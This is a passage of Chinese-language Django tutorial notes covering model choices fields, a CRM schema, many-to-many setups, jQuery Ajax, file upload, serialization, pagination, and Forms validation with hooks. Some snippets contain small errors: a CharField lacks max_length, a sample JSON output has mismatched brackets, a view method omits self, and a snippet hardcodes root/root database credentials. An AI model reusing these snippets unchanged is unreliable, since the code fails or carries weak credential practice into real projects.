        # 该第三张关系表
        edit_obj.authors.set(authors_list)
        return redirect('book_list')

    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    return render(request,'book_edit.html',locals())


def book_delete(request,delete_id):
    # 简单粗暴 直接删除
    models.Book.objects.filter(pk=delete_id).delete()
    # 直接跳转到展示页
    return redirect('book_list')
```

#### choices参数(数据库字段设计常见)

```python
"""
用户表	
	性别
	学历
	工作经验
	是否结婚
	是否生子
	客户来源
	...
针对某个可以列举完全的可能性字段，我们应该如何存储

只要某个字段的可能性是可以列举完全的，那么一般情况下都会采用choices参数
"""
class User(models.Model):
    username = models.CharField(max_length=32)
    age = models.IntegerField()
    # 性别
    gender_choices = (
        (1,'男'),
        (2,'女'),
        (3,'其他'),
    )
    gender = models.IntegerField(choices=gender_choices)
    
    score_choices = (
        ('A','优秀'),
        ('B','良好'),
        ('C','及格'),
        ('D','不合格'),
    )
    # 保证字段类型跟列举出来的元祖第一个数据类型一致即可
    score = models.CharField(choices=score_choices,null=True)
    """
    该gender字段存的还是数字 但是如果存的数字在上面元祖列举的范围之内
    那么可以非常轻松的获取到数字对应的真正的内容
    
    1.gender字段存的数字不在上述元祖列举的范围内容
    2.如果在 如何获取对应的中文信息
    """
    
      
    from app01 import models
    # models.User.objects.create(username='jason',age=18,gender=1)
    # models.User.objects.create(username='egon',age=85,gender=2)
    # models.User.objects.create(username='tank',age=40,gender=3)
    # 存的时候 没有列举出来的数字也能存（范围还是按照字段类型决定）
    # models.User.objects.create(username='tony',age=45,gender=4)

    # 取
    # user_obj = models.User.objects.filter(pk=1).first()
    # print(user_obj.gender)
    # 只要是choices参数的字段 如果你想要获取对应信息 固定写法 get_字段名_display()
    # print(user_obj.get_gender_display())

    user_obj = models.User.objects.filter(pk=4).first()
    # 如果没有对应关系 那么字段是什么还是展示什么
    print(user_obj.get_gender_display())  # 4
    
 
# 实际项目案例
# CRM相关内部表
class School(models.Model):
    """
    校区表
    如：
        北京沙河校区
        上海校区

    """
    title = models.CharField(verbose_name='校区名称', max_length=32)

    def __str__(self):
        return self.title

class Course(models.Model):
    """
    课程表
    如：
        Linux基础
        Linux架构师
        Python自动化开发精英班
        Python自动化开发架构师班
        Python基础班
        go基础班
    """
    name = models.CharField(verbose_name='课程名称', max_length=32)

    def __str__(self):
        return self.name

class Department(models.Model):
    """
    部门表
    市场部     1000
    销售       1001

    """
    title = models.CharField(verbose_name='部门名称', max_length=16)
    code = models.IntegerField(verbose_name='部门编号', unique=True, null=False)

    def __str__(self):
        return self.title

class UserInfo(models.Model):
    """
    员工表
    """

    name = models.CharField(verbose_name='员工姓名', max_length=16)
    email = models.EmailField(verbose_name='邮箱', max_length=64)
    depart = models.ForeignKey(verbose_name='部门', to="Department",to_field="code")
    user=models.OneToOneField("User",default=1)
    def __str__(self):
        return self.name

class ClassList(models.Model):
    """
    班级表
    如：
        Python全栈  面授班  5期  10000  2017-11-11  2018-5-11
    """
    school = models.ForeignKey(verbose_name='校区', to='School')
    course = models.ForeignKey(verbose_name='课程名称', to='Course')
    semester = models.IntegerField(verbose_name="班级(期)")


    price = models.IntegerField(verbose_name="学费")
    start_date = models.DateField(verbose_name="开班日期")
    graduate_date = models.DateField(verbose_name="结业日期", null=True, blank=True)
    memo = models.CharField(verbose_name='说明', max_length=256, blank=True, null=True, )

    teachers = models.ManyToManyField(verbose_name='任课老师', to='UserInfo',limit_choices_to={'depart':1002})
    tutor = models.ForeignKey(verbose_name='班主任', to='UserInfo',related_name="class_list",limit_choices_to={'depart':1006})


    def __str__(self):
        return "{0}({1}期)".format(self.course.name, self.semester)


class Customer(models.Model):
    """
    客户表
    """
    qq = models.CharField(verbose_name='qq', max_length=64, unique=True, help_text='QQ号必须唯一')

    name = models.CharField(verbose_name='学生姓名', max_length=16)
    gender_choices = ((1, '男'), (2, '女'))
    gender = models.SmallIntegerField(verbose_name='性别', choices=gender_choices)

    education_choices = (
        (1, '重点大学'),
        (2, '普通本科'),
        (3, '独立院校'),
        (4, '民办本科'),
        (5, '大专'),
        (6, '民办专科'),
        (7, '高中'),
        (8, '其他')
    )
    education = models.IntegerField(verbose_name='学历', choices=education_choices, blank=True, null=True, )
    graduation_school = models.CharField(verbose_name='毕业学校', max_length=64, blank=True, null=True)
    major = models.CharField(verbose_name='所学专业', max_length=64, blank=True, null=True)

    experience_choices = [
        (1, '在校生'),
        (2, '应届毕业'),
        (3, '半年以内'),
        (4, '半年至一年'),
        (5, '一年至三年'),
        (6, '三年至五年'),
        (7, '五年以上'),
    ]
    experience = models.IntegerField(verbose_name='工作经验', blank=True, null=True, choices=experience_choices)
    work_status_choices = [
        (1, '在职'),
        (2, '无业')
    ]
    work_status = models.IntegerField(verbose_name="职业状态", choices=work_status_choices, default=1, blank=True,
                                      null=True)
    company = models.CharField(verbose_name="目前就职公司", max_length=64, blank=True, null=True)
    salary = models.CharField(verbose_name="当前薪资", max_length=64, blank=True, null=True)

    source_choices = [
        (1, "qq群"),
        (2, "内部转介绍"),
        (3, "官方网站"),
        (4, "百度推广"),
        (5, "360推广"),
        (6, "搜狗推广"),
        (7, "腾讯课堂"),
        (8, "广点通"),
        (9, "高校宣讲"),
        (10, "渠道代理"),
        (11, "51cto"),
        (12, "智汇推"),
        (13, "网盟"),
        (14, "DSP"),
        (15, "SEO"),
        (16, "其它"),
    ]
    source = models.SmallIntegerField('客户来源', choices=source_choices, default=1)
    referral_from = models.ForeignKey(
        'self',
        blank=True,
        null=True,
        verbose_name="转介绍自学员",
        help_text="若此客户是转介绍自内部学员,请在此处选择内部学员姓名",
        related_name="internal_referral"
    )
    course = models.ManyToManyField(verbose_name="咨询课程", to="Course")

    status_choices = [
        (1, "已报名"),
        (2, "未报名")
    ]
    status = models.IntegerField(
        verbose_name="状态",
        choices=status_choices,
        default=2,
        help_text=u"选择客户此时的状态"
    )

    consultant = models.ForeignKey(verbose_name="课程顾问", to='UserInfo', related_name='consultanter',limit_choices_to={'depart':1001})

    date = models.DateField(verbose_name="咨询日期", auto_now_add=True)
    recv_date = models.DateField(verbose_name="当前课程顾问的接单日期", null=True)
    last_consult_date = models.DateField(verbose_name="最后跟进日期", )

    def __str__(self):
        return self.name

class ConsultRecord(models.Model):
    """
    客户跟进记录
    """
    customer = models.ForeignKey(verbose_name="所咨询客户", to='Customer')
    consultant = models.ForeignKey(verbose_name="跟踪人", to='UserInfo',limit_choices_to={'depart':1001})
    date = models.DateField(verbose_name="跟进日期", auto_now_add=True)
    note = models.TextField(verbose_name="跟进内容...")

    def __str__(self):
        return self.customer.name + ":" + self.consultant.name

class Student(models.Model):
    """
    学生表（已报名）
    """
    customer = models.OneToOneField(verbose_name='客户信息', to='Customer')
    class_list = models.ManyToManyField(verbose_name="已报班级", to='ClassList', blank=True)

    emergency_contract = models.CharField(max_length=32, blank=True, null=True, verbose_name='紧急联系人')
    company = models.CharField(verbose_name='公司', max_length=128, blank=True, null=True)
    location = models.CharField(max_length=64, verbose_name='所在区域', blank=True, null=True)
    position = models.CharField(verbose_name='岗位', max_length=64, blank=True, null=True)
    salary = models.IntegerField(verbose_name='薪资', blank=True, null=True)
    welfare = models.CharField(verbose_name='福利', max_length=256, blank=True, null=True)
    date = models.DateField(verbose_name='入职时间', help_text='格式yyyy-mm-dd', blank=True, null=True)
    memo = models.CharField(verbose_name='备注', max_length=256, blank=True, null=True)

    def __str__(self):
        return self.customer.name

class ClassStudyRecord(models.Model):
    """
    上课记录表 （班级记录）
    """
    class_obj = models.ForeignKey(verbose_name="班级", to="ClassList")
    day_num = models.IntegerField(verbose_name="节次", help_text=u"此处填写第几节课或第几天课程...,必须为数字")
    teacher = models.ForeignKey(verbose_name="讲师", to='UserInfo',limit_choices_to={'depart':1002})
    date = models.DateField(verbose_name="上课日期", auto_now_add=True)

    course_title = models.CharField(verbose_name='本节课程标题', max_length=64, blank=True, null=True)
    course_memo = models.TextField(verbose_name='本节课程内容概要', blank=True, null=True)
    has_homework = models.BooleanField(default=True, verbose_name="本节有作业")
    homework_title = models.CharField(verbose_name='本节作业标题', max_length=64, blank=True, null=True)
    homework_memo = models.TextField(verbose_name='作业描述', max_length=500, blank=True, null=True)
    exam = models.TextField(verbose_name='踩分点', max_length=300, blank=True, null=True)

    def __str__(self):
        return "{0} day{1}".format(self.class_obj, self.day_num)

class StudentStudyRecord(models.Model):
    '''
    学生学习记录
    '''
    classstudyrecord = models.ForeignKey(verbose_name="第几天课程", to="ClassStudyRecord")
    student = models.ForeignKey(verbose_name="学员", to='Student')







    record_choices = (('checked', "已签到"),
                      ('vacate', "请假"),
                      ('late', "迟到"),
                      ('noshow', "缺勤"),
                      ('leave_early', "早退"),
                      )
    record = models.CharField("上课纪录", choices=record_choices, default="checked", max_length=64)
    score_choices = ((100, 'A+'),
                     (90, 'A'),
                     (85, 'B+'),
                     (80, 'B'),
                     (70, 'B-'),
                     (60, 'C+'),
                     (50, 'C'),
                     (40, 'C-'),
                     (0, ' D'),
                     (-1, 'N/A'),
                     (-100, 'COPY'),
                     (-1000, 'FAIL'),
                     )
    score = models.IntegerField("本节成绩", choices=score_choices, default=-1)
    homework_note = models.CharField(verbose_name='作业评语', max_length=255, blank=True, null=True)
    note = models.CharField(verbose_name="备注", max_length=255, blank=True, null=True)

    homework = models.FileField(verbose_name='作业文件', blank=True, null=True, default=None)
    stu_memo = models.TextField(verbose_name='学员备注', blank=True, null=True)
    date = models.DateTimeField(verbose_name='提交作业日期', auto_now_add=True)

    def __str__(self):
        return "{0}-{1}".format(self.classstudyrecord, self.student)
         
"""
chocies参数使用场景是非常广泛的
"""
```

#### MTV与MVC模型

```python
# MTV:Django号称是MTV模型
M:models
T:templates
V:views
# MVC:其实django本质也是MVC
M:models
V:views
C:controller
  
# vue框架:MVVM模型
```

#### 多对多三种创建方式

```python
# 全自动:利用orm自动帮我们创建第三张关系表
	class Book(models.Model):
    name = models.CharField(max_length=32)
    authors = models.ManyToManyField(to='Author')
	class Author(models.Model):
    name = models.CharField(max_length=32)
	"""
	优点:代码不需要你写 非常的方便 还支持orm提供操作第三张关系表的方法...
	不足之处:第三张关系表的扩展性极差(没有办法额外添加字段...)
	"""
# 纯手动
	class Book(models.Model):
    name = models.CharField(max_length=32)
    
	class Author(models.Model):
    name = models.CharField(max_length=32)
  
  class Book2Author(models.Model):
    book_id = models.ForeignKey(to='Book')
    author_id = models.ForeignKey(to='Author')
  '''
  优点:第三张表完全取决于你自己进行额外的扩展
  不足之处:需要写的代码较多，不能够再使用orm提供的简单的方法
  不建议你用该方式
  '''

# 半自动
class Book(models.Model):
    name = models.CharField(max_length=32)
    authors = models.ManyToManyField(to='Author',
                                     through='Book2Author',
                                     through_fields=('book','author')
                                     )
class Author(models.Model):
    name = models.CharField(max_length=32)
    # books = models.ManyToManyField(to='Book',
    #                                  through='Book2Author',
    #                                  through_fields=('author','book')
    #                                  )
class Book2Author(models.Model):
    book = models.ForeignKey(to='Book')
    author = models.ForeignKey(to='Author')

"""
through_fields字段先后顺序
    判断的本质：
        通过第三张表查询对应的表 需要用到哪个字段就把哪个字段放前面
    你也可以简化判断
        当前表是谁 就把对应的关联字段放前面
        
        
半自动:可以使用orm的正反向查询 但是没法使用add,set,remove,clear这四个方法
"""

# 总结:你需要掌握的是全自动和半自动 为了扩展性更高 一般我们都会采用半自动(写代码要给自己留一条后路)
```

#### Ajax

```python
"""
异步提交
局部刷新
例子:github注册
	动态获取用户名实时的跟后端确认并实时展示的前端(局部刷新)
	
朝发送请求的方式
	1.浏览器地址栏直接输入url回车						   GET请求
	2.a标签href属性											    GET请求
	3.form表单														 GET请求/POST请求
	4.ajax																GET请求/POST请求	
	
AJAX 不是新的编程语言，而是一种使用现有标准的新方法(比较装饰器)


AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。（这一特点给用户的感受是在不知不觉中完成请求和响应过程）


Ajax我们只学习jQuery封装之后的版本(不学原生的 原生的复杂并且在实际项目中也一般不用)
所以我们在前端页面使用ajax的时候需要确保导入了jQuery
ps:并不只有jQuery能够实现ajax，其他的框架也可以 但是换汤不换药 原理是一样的
"""
```

#### 小例子

```python
"""
页面上有三个input框
	在前两个框中输入数字 点击按钮 朝后端发送ajax请求
	后端计算出结果 再返回给前端动态展示的到第三个input框中
	(整个过程页面不准有刷新,也不能在前端计算)
"""
<script>
    // 先给按钮绑定一个点击事件
    $('#btn').click(function () {
        // 朝后端发送ajax请求
        $.ajax({
            // 1.指定朝哪个后端发送ajax请求
            url:'', // 不写就是朝当前地址提交
            // 2.请求方式
            type:'post',  // 不指定默认就是get 都是小写
            // 3.数据
            {#data:{'username':'jason','password':123},#}
            data:{'i1':$('#d1').val(),'i2':$('#d2').val()},
            // 4.回调函数:当后端给你返回结果的时候会自动触发 args接受后端的返回结果
            success:function (args) {
                {#alert(args)  // 通过DOM操作动态渲染到第三个input里面#}
                $('#d3').val(args)
                console.log(typeof args)

            }
        })
    })
</script> 
            
            
class MyLogin(View):
    def sql(request):
        conn = pymysql.connect(
            host='127.0.0.1',
            port=3306,
            user='root',
            password='root',
            database='day60',
            charset='utf8'  # 编码千万不要加-
        )

        if request.method == "POST":
            # print(request.POST)  # <QueryDict: {'username': ['jason'], 'password': ['123']}>
            i1 = request.POST.get('i1')
            i2 = request.POST.get('i2')
            # 先转成整型再加
            i3 = int(i1) + int(i2)
            print(i3)
            d = {'code':100,'msg':i3}
            # d = {'code': 100, 'msg': 666}
            return HttpResponse(json.dumps(d))
            # return JsonResponse(d)
        return render(request, 'index.html')            
"""
针对后端如果是用HttpResponse返回的数据 回调函数不会自动帮你反序列化
如果后端直接用的是JsonResponse返回的数据 回调函数会自动帮你反序列化

HttpResponse解决方式
	1.自己在前端利用JSON.parse()
	2.在ajax里面配置一个参数
			(后面再讲)
"""
```

[![p9G6KSO.png](https://s1.ax1x.com/2023/05/02/p9G6KSO.png)](https://imgse.com/i/p9G6KSO)

#### 前后端传输数据的编码格式(contentType)

```python
# 我们主要研究post请求数据的编码格式
"""
get请求数据就是直接放在url后面的
url?username=jason&password=123
"""

# 可以朝后端发送post请求的方式
	"""
	1.form表单
	2.ajax请求
	"""

  
"""
前后端传输数据的编码格式
	urlencoded
	
	formdata
	
	json
"""
# 研究form表单
	默认的数据编码格式是urlencoded
  数据格式:username=jason&password=123
  django后端针对符合urlencoded编码格式的数据都会自动帮你解析封装到request.POST中
  	username=jason&password=123	>>> request.POST
  
  如果你把编码格式改成formdata，那么针对普通的键值对还是解析到request.POST中而将文件解析到request.FILES中
  
  form表单是没有办法发送json格式数据的
 

# 研究ajax
	默认的编码格式也是urlencoded
  数据格式:username=jason&age=20
	django后端针对符合urlencoded编码格式的数据都会自动帮你解析封装到request.POST中
  	username=jason&age=20	>>> request.POST
```

#### ajax发送json格式数据

```python
"""
前后端传输数据的时候一定要确保编码格式跟数据真正的格式是一致的
不要骗人家!!!

{"username":"jason","age":25}  
	在request.POST里面肯定找不到
	
	django针对json格式的数据 不会做任何的处理 
	
request对象方法补充
	request.is_ajax()
		判断当前请求是否是ajax请求 返回布尔值

"""

<script>
    $('#d1').click(function () {
        $.ajax({
            url:'',
            type:'post',
            data:JSON.stringify({'username':'jason','age':25}),
            contentType:'application/json',  // 指定编码格式
            success:function () {

            }
        })
    })
</script>

        json_bytes = request.body
        json_str = json_bytes.decode('utf-8')
        json_dict = json.loads(json_str)

        # json.loads括号内如果传入了一个二进制格式的数据那么内部自动解码再反序列化
        json_dict = json.loads(json_bytes)
        
"""
ajax发送json格式数据需要注意点
	1.contentType参数指定成:application/json
	2.数据是真正的json格式数据
	3.django后端不会帮你处理json格式数据需要你自己去request.body获取并处理
"""
```

#### ajax发送文件

```python
"""
ajax发送文件需要借助于js内置对象FormData

"""
<script>
    // 点击按钮朝后端发送普通键值对和文件数据
    $('#d4').on('click',function () {
        // 1 需要先利用FormData内置对象
        let formDateObj = new FormData();
        // 2 添加普通的键值对
        formDateObj.append('username',$('#d1').val());
        formDateObj.append('password',$('#d2').val());
        // 3 添加文件对象
        formDateObj.append('myfile',$('#d3')[0].files[0])
        // 4 将对象基于ajax发送给后端
        $.ajax({
            url:'',
            type:'post',
            data:formDateObj,  // 直接将对象放在data后面即可

            // ajax发送文件必须要指定的两个参数
            contentType:false,  // 不需使用任何编码 django后端能够自动识别formdata对象
            processData:false,  // 告诉你的浏览器不要对你的数据进行任何处理

            success:function (args) {
            }
        })


    })
</script>

def ab_file(request):
    if request.is_ajax():
        if request.method == 'POST':
            print(request.POST)
            print(request.FILES)
    return render(request,'ab_file.html')
  
"""
总结:
	1.需要利用内置对象FormData
				// 2 添加普通的键值对
        formDateObj.append('username',$('#d1').val());
        formDateObj.append('password',$('#d2').val());
        // 3 添加文件对象
        formDateObj.append('myfile',$('#d3')[0].files[0])
	2.需要指定两个关键性的参数
				contentType:false,  // 不需使用任何编码 django后端能够自动识别formdata对象
        processData:false,  // 告诉你的浏览器不要对你的数据进行任何处理
	3.django后端能够直接识别到formdata对象并且能够将内部的普通键值自动解析并封装到request.POST中 文件数据自动解析并封装到request.FILES中
"""
```

#### django自带的序列化组件(drf做铺垫)

```python
"""
如果发现你可以直接使用MySQL但是无法使用sqlite3
不要慌张不要恐惧 你只需要按照之前MySQL的操作将sqlite3的驱动装一下即可
"""
# 需求:在前端给我获取到后端用户表里面所有的数据 并且要是列表套字典
import json
from django.http import JsonResponse
from django.core import serializers
def ab_ser(request):
    user_queryset = models.User.objects.all()
    # [{},{},{},{},{}]
    # user_list = []
    # for user_obj in user_queryset:
    #     tmp = {
    #         'pk':user_obj.pk,
    #         'username':user_obj.username,
    #         'age':user_obj.age,
    #         'gender':user_obj.get_gender_display()
    #     }
    #     user_list.append(tmp)
    # return JsonResponse(user_list,safe=False)
    # return render(request,'ab_ser.html',locals())

    # 序列化
    res = serializers.serialize('json',user_queryset)
    """会自动帮你将数据变成json格式的字符串 并且内部非常的全面"""
    return HttpResponse(res)
"""
[
 {"pk": 1, "username": "jason", "age": 25, "gender": "male"}, 
 {"pk": 2, "username": "egon", "age": 31, "gender": "female"},
 {"pk": 3, "username": "kevin", "age": 32, "gender": "others"}, 
 {"pk": 4, "username": "tank", "age": 40, "gender": 4}
 ]
前后端分离的项目
    作为后端开发的你只需要写代码将数据处理好
    能够序列化返回给前端即可 
        再写一个接口文档 告诉前端每个字段代表的意思即可
        
        
[
{   "model": "app01.user", 
    "pk": 1, 
    "fields": {"username": "jason", "age": 25, "gender": 1]}, 
    
{   "model": "app01.user", 
    "pk": 2, 
    "fields": {"username": "egon", "age": 31, "gender": 2]}, 
    
{   "model": "app01.user", 
    "pk": 3, 
    "fields": {"username": "kevin", "age": 32, "gender": 3]},
     
{   "model": "app01.user", 
    "pk": 4, 
    "fields": {"username": "tank", "age": 40, "gender": 4]}
]
写接口就是利用序列化组件渲染数据然后写一个接口文档 该交代交代一下就完事
"""
```

[![p9GcyKe.png](https://s1.ax1x.com/2023/05/02/p9GcyKe.png)](https://imgse.com/i/p9GcyKe)

#### ajax结合sweetalert

```python
"""
自己要学会如何拷贝
学会基于别人的基础之上做修改
研究各个参数表示的意思 然后找葫芦画瓢
"""
<script>
    $('.del').on('click',function () {
        // 先将当前标签对象存储起来
        let currentBtn = $(this);
        // 二次确认弹框
        swal({
          title: "你确定要删吗?",
          text: "你可要考虑清除哦，可能需要拎包跑路哦!",
          type: "warning",
          showCancelButton: true,
          confirmButtonClass: "btn-danger",
          confirmButtonText: "是的，老子就要删!",
          cancelButtonText: "算了,算了!",
          closeOnConfirm: false,
          closeOnCancel: false,
          showLoaderOnConfirm: true
        },
        function(isConfirm) {
          if (isConfirm) {
                // 朝后端发送ajax请求删除数据之后 再弹下面的提示框
                $.ajax({
                    {#url:'/delete/user/' + currentBtn.attr('delete_id'),  // 1 传递主键值方式1#}
                    url:'/delete/user/',  // 2 放在请求体里面
                    type:'post',
                    data:{'delete_id':currentBtn.attr('delete_id')},
                    success:function (args) {  // args = {'code':'','msg':''}
                        // 判断响应状态码 然后做不同的处理
                        if(args.code === 1000){
                            swal("删了!", args.msg, "success");
                            // 1.lowb版本 直接刷新当前页面
                            {#window.location.reload()#}
                            // 2.利用DOM操作 动态刷新
                            currentBtn.parent().parent().remove()
                        }else{
                            swal('完了','出现了位置的错误','info')
                        }
                    }

                })

          } else {
            swal("怂逼", "不要说我认识你", "error");
          }
        });
    })

</script>
```

#### 批量插入

```python
def ab_pl(request):
    # 先给Book插入一万条数据
    # for i in range(10000):
    #     models.Book.objects.create(title='第%s本书'%i)
    # # 再将所有的数据查询并展示到前端页面
    book_queryset = models.Book.objects.all()

    # 批量插入
    # book_list = []
    # for i in range(100000):
    #     book_obj = models.Book(title='第%s本书'%i)
    #     book_list.append(book_obj)
    # models.Book.objects.bulk_create(book_list)
    """
    当你想要批量插入数据的时候 使用orm给你提供的bulk_create能够大大的减少操作时间
    :param request: 
    :return: 
    """
    return render(request,'ab_pl.html',locals())
```

#### 分页器

```python
"""
总数据100 每页展示10 需要10
总数据101 每页展示10 需要11
总数据99 每页展示10  需要10

如何通过代码动态的计算出到底需要多少页？


在制作页码个数的时候 一般情况下都是奇数个		符合中国人对称美的标准
"""
# 分页
    book_list = models.Book.objects.all()

    # 想访问哪一页
    current_page = request.GET.get('page',1)  # 如果获取不到当前页码 就展示第一页
    # 数据类型转换
    try:
        current_page = int(current_page)
    except Exception:
        current_page = 1
    # 每页展示多少条
    per_page_num = 10
    # 起始位置
    start_page = (current_page - 1) * per_page_num
    # 终止位置
    end_page = current_page * per_page_num

    # 计算出到底需要多少页
    all_count = book_list.count()

    page_count, more = divmod(all_count, per_page_num)
    if more:
        page_count += 1

    page_html = ''
    xxx = current_page
    if current_page < 6:
        current_page = 6
    for i in range(current_page-5,current_page+6):
        if xxx == i:
            page_html += '<li class="active"><a href="?page=%s">%s</a></li>'%(i,i)
        else:
            page_html += '<li><a href="?page=%s">%s</a></li>'%(i,i)



    book_queryset =  book_list[start_page:end_page]
    
"""
django中有自带的分页器模块 但是书写起来很麻烦并且功能太简单
所以我们自己想法和设法的写自定义分页器

上述推导代码你无需掌握 只需要知道内部逻辑即可

我们基于上述的思路 已经封装好了我们自己的自定义分页器 
之后需要使用直接拷贝即可
"""
```

#### 自定义分页器的拷贝及使用

```python
"""
当我们需要使用到非django内置的第三方功能或者组件代码的时候
我们一般情况下会创建一个名为utils文件夹 在该文件夹内对模块进行功能性划分
	utils可以在每个应用下创建 具体结合实际情况

我们到了后期封装代码的时候 不再局限于函数
还是尽量朝面向对象去封装

我们自定义的分页器是基于bootstrap样式来的 所以你需要提前导入bootstrap
	bootstrap 版本 v3
	jQuery		版本 v3
"""
# 后端
book_queryset = models.Book.objects.all()
current_page = request.GET.get('page',1)
all_count = book_queryset.count()
# 1 传值生成对象
page_obj = Pagination(current_page=current_page,all_count=all_count)
# 2 直接对总数据进行切片操作
page_queryset = book_queryset[page_obj.start:page_obj.end]
# 3 将page_queryset传递到页面 替换之前的book_queryset


# 前端
{# for book_obj in page_queryset #}
    <p>{[ book_obj.title ]}</p>
    <nav aria-label="Page navigation">
</nav>
{# endfor #}
{#利用自定义分页器直接显示分页器样式#}
{[ page_obj.page_html|safe ]}
  
"""
你们只需要掌握如何拷贝使用 以及大致的推导思路即可
"""
```

#### Forms组件-前戏

```python
"""
写一个注册功能
	获取用户名和密码 利用form表单提交数据
	在后端判断用户名和密码是否符合一定的条件
		用户名中不能含有金瓶梅
		密码不能少于三位
	
	如何符合条件需要你将提示信息展示到前端页面
"""
def ab_form(request):
    back_dic = {'username':'','password':''}
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if '金瓶梅' in username:
            back_dic['username'] = '不符合社会主义核心价值观'
        if len(password) < 3:
            back_dic['password'] = '不能太短 不好!'
    """
    无论是post请求还是get请求
    页面都能够获取到字典 只不过get请求来的时候 字典值都是空的
    而post请求来之后 字典可能有值
    """
    return render(request,'ab_form.html',locals())

<form action="" method="post">
    <p>username:
        <input type="text" name="username">
        <span style="color: red">{[ back_dic.username ]}</span>
    </p>
    <p>password:
        <input type="text" name="password">
        <span style="color: red">{[ back_dic.password ]}</span>
    </p>
    <input type="submit" class="btn btn-info">
</form>


"""
1.手动书写前端获取用户数据的html代码						渲染html代码
2.后端对用户数据进行校验											 校验数据
3.对不符合要求的数据进行前端提示								展示提示信息

forms组件
	能够完成的事情
			1.渲染html代码
			2.校验数据
			3.展示提示信息

为什么数据校验非要去后端 不能在前端利用js直接完成呢？
	数据校验前端可有可无
	但是后端必须要有!!!
	
	因为前端的校验是弱不禁风的 你可以直接修改
	或者利用爬虫程序绕过前端页面直接朝后端提交数据
	
	购物网站	
		选取了货物之后 会计算一个价格发送给后端 如果后端不做价格的校验
		
		实际是获取到用户选择的所有商品的主键值
		然后在后端查询出所有商品的价格 再次计算一遍
		如果跟前端一致 那么完成支付如果不一致直接拒绝
"""
```

#### 基本使用

```python
from django import forms


class MyForm(forms.Form):
    # username字符串类型最小3位最大8位
    username = forms.CharField(min_length=3,max_length=8)
    # password字符串类型最小3位最大8位
    password = forms.CharField(min_length=3,max_length=8)
    # email字段必须符合邮箱格式  xxx@xx.com
    email = forms.EmailField()
```

#### 校验数据

```python
"""
1.测试环境的准备 可以自己拷贝代码准备
2.其实在pycharm里面已经帮你准备一个测试环境
	python console
"""
from app01 import views
# 1 将带校验的数据组织成字典的形式传入即可
form_obj = views.MyForm({'username':'jason','password':'123','email':'123'})
# 2 判断数据是否合法		注意该方法只有在所有的数据全部合法的情况下才会返回True
form_obj.is_valid()
False
# 3 查看所有校验通过的数据
form_obj.cleaned_data
{'username': 'jason', 'password': '123'}
# 4 查看所有不符合校验规则以及不符合的原因
form_obj.errors
{
  'email': ['Enter a valid email address.']
}
# 5 校验数据只校验类中出现的字段 多传不影响 多传的字段直接忽略
form_obj = views.MyForm({'username':'jason','password':'123','email':'123@qq.com','hobby':'study'})
form_obj.is_valid()
True
# 6 校验数据 默认情况下 类里面所有的字段都必须传值
form_obj = views.MyForm({'username':'jason','password':'123'})
form_obj.is_valid()
False
"""
也就意味着校验数据的时候 默认情况下数据可以多传但是绝不可能少传
"""
```

#### 渲染标签

```python
"""
forms组件只会自动帮你渲染获取用户输入的标签(input select radio checkbox)
不能帮你渲染提交按钮
"""
def index(request):
    # 1 先产生一个空对象
    form_obj = MyForm()
    # 2 直接将该空对象传递给html页面
    return render(request,'index.html',locals())

# 前端利用空对象做操作
    <p>第一种渲染方式:代码书写极少，封装程度太高 不便于后续的扩展 一般情况下只在本地测试使用</p>
    {[ form_obj.as_p ]}
    {[ form_obj.as_ul ]}
    {[ form_obj.as_table ]}
    <p>第二种渲染方式:可扩展性很强 但是需要书写的代码太多  一般情况下不用</p>
    <p>{[ form_obj.username.label ]}:{[ form_obj.username ]}</p>
    <p>{[ form_obj.password.label ]}:{[ form_obj.password ]}</p>
    <p>{[ form_obj.email.label ]}:{[ form_obj.email ]}</p>
    <p>第三种渲染方式(推荐使用):代码书写简单 并且扩展性也高</p>
    {# for form in form_obj #}
        <p>{[ form.label ]}:{[ form ]}</p>
    {# endfor #}
 
"""
label属性默认展示的是类中定义的字段首字母大写的形式
也可以自己修改 直接给字段对象加label属性即可
	 username = forms.CharField(min_length=3,max_length=8,label='用户名')
"""
```

#### 展示提示信息

```python
"""
浏览器会自动帮你校验数据 但是前端的校验弱不禁风
如何让浏览器不做校验
	<form action="" method="post" novalidate>
"""
def index(request):
    # 1 先产生一个空对象
    form_obj = MyForm()
    if request.method == 'POST':
        # 获取用户数据并且校验
        """
        1.数据获取繁琐
        2.校验数据需要构造成字典的格式传入才行
        ps:但是request.POST可以看成就是一个字典
        """
        # 3.校验数据
        form_obj = MyForm(request.POST)
        # 4.判断数据是否合法
        if form_obj.is_valid():
            # 5.如果合法 操作数据库存储数据
            return HttpResponse('OK')
        # 5.不合法 有错误
    # 2 直接将该空对象传递给html页面
    return render(request,'index.html',locals())

{# for form in form_obj #}
        <p>
            {[ form.label ]}:{[ form ]}
            <span style="color: red">{[ form.errors.0 ]}</span>
        </p>
{# endfor #}

"""
1.必备的条件 get请求和post传给html页面对象变量名必须一样
2.forms组件当你的数据不合法的情况下 会保存你上次的数据 让你基于之前的结果进行修改
更加的人性化
"""
# 针对错误的提示信息还可以自己自定制
class MyForm(forms.Form):
    # username字符串类型最小3位最大8位
    username = forms.CharField(min_length=3,max_length=8,label='用户名',
                               error_messages={
                                   'min_length':'用户名最少3位',
                                   'max_length':'用户名最大8位',
                                   'required':"用户名不能为空"
                               }
                               )
    # password字符串类型最小3位最大8位
    password = forms.CharField(min_length=3,max_length=8,label='密码',
                               error_messages={
                                   'min_length': '密码最少3位',
                                   'max_length': '密码最大8位',
                                   'required': "密码不能为空"
                               }
                               )
    # email字段必须符合邮箱格式  xxx@xx.com
    email = forms.EmailField(label='邮箱',
                             error_messages={
                                 'invalid':'邮箱格式不正确',
                                 'required': "邮箱不能为空"
                             }
                             )
```

#### 钩子函数(HOOK)

```python
"""
在特定的节点自动触发完成响应操作

钩子函数在forms组件中就类似于第二道关卡，能够让我们自定义校验规则

在forms组件中有两类钩子
	1.局部钩子
		当你需要给单个字段增加校验规则的时候可以使用
	2.全局钩子
  	当你需要给多个字段增加校验规则的时候可以使用
"""
# 实际案例

# 1.校验用户名中不能含有666				只是校验username字段  局部钩子

# 2.校验密码和确认密码是否一致			password confirm两个字段	全局钩子

# 钩子函数  在类里面书写方法即可
    # 局部钩子
    def clean_username(self):
        # 获取到用户名
        username = self.cleaned_data.get('username')
        if '666' in username:
            # 提示前端展示错误信息
            self.add_error('username','光喊666是不行滴～')
        # 将钩子函数钩去出来数据再放回去
        return username

    # 全局钩子
    def clean(self):
